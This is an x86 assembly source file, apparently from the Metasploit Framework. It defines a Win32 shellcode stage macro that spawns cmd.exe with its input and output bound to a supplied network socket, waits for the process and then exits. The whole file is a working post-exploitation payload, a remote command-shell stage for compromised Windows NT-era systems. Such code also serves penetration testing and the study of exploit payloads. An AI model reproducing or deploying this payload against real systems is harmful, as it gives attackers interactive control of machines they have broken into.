;      Title:  Win32 cmd.exe shell stage for WSA sockets
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm, spoonm, skape, vlad902

[BITS 32]

; expects:
;   [ebp +  0] = kernel32.dll base
;   [ebp +  4] = LGetProcAddress
;   [ebp +  8] = LoadLibraryA
;   edi        = socket
; returns:
;   doesn't.
; %1 = whether to resolve our own functions or not
; if %1 = 0 then you must have FN_CREATEPROCESS, etc
%macro STAGE_WSA_SHELL 1
  ; Struct init and CreateProcessA call orignally written by skape (mmiller@hick.org)
  ; Modified and optimized by vlad902 (vlad902@gmail.com)
  LSetCommand:
      push "CMD"
      mov esi, esp
  
  LCreateProcessStructs:
      xchg edi, edx       ; save edi to edx

      push byte 0x50      ; struct sizes
      pop ecx
      sub esp, ecx	  ; Allocate space
      mov edi, esp
      push byte 0x44	  ; First element in first struct.
      mov ebx, esp	  ; beginning for first struct.

  LBZero:
      xor eax, eax         ; overwrite with null
      rep stosb           ; overwrite with null

  LCreateStructs:
      inc byte [ebx + 0x2c] ; si.dwflags
      inc byte [ebx + 0x2d] ; si.dwflags

      lea edi, [ebx + 0x38] ; 3 socket fd's need to be written here (last 3 elements of the struct)
      mov	eax, edx    ; socket fd 
      stosd
      stosd
      stosd
; edi now points to the start of the second struct.

      push	edi         ; second struct
      push	ebx         ; first struct
      push	ecx         ; NULL
      push	ecx         ; NULL
      push	ecx         ; NULL
      push	byte 0x01
      push	ecx         ; NULL
      push	ecx         ; NULL
      push	esi         ; "cmd" pointer
      push	ecx         ; NULL

      mov	esi, edi    ; Back-up edi in esi
      xchg	edx, edi    ; restore edi to socket fd. ("standard" API)
  LCreateProcessA:
%if %1 == 1
      push dword [ebp] ; kernel32.dll
      HASH {push dword}, 'CreateProcessA'
      call [ebp + 4]
      call eax
%else
      call FN_CREATEPROCESS
%endif
      
  LWaitForSingleObject:
%if %1 == 1
      push dword [ebp] ; kernel32.dll
      HASH {push dword}, 'WaitForSingleObject'
      call [ebp + 4]
%endif

      push byte 0xff	; dwMilliseconds (infinite)
      push dword [esi]	; Process Handle
%if %1 == 1
      call eax
%else
      call FN_WAITSINGLEOBJECT
%endif
      
  LDeathBecomesYou:
%if %1 == 1
      push dword [ebp] ; kernel32.dll
      HASH {push dword}, 'ExitProcess'
      call [ebp + 4]
%endif
      
      push byte 0x00	; exit value (0)
%if %1 == 1
      call eax
%else
      call FN_EXITPROCESS
%endif

%endmacro
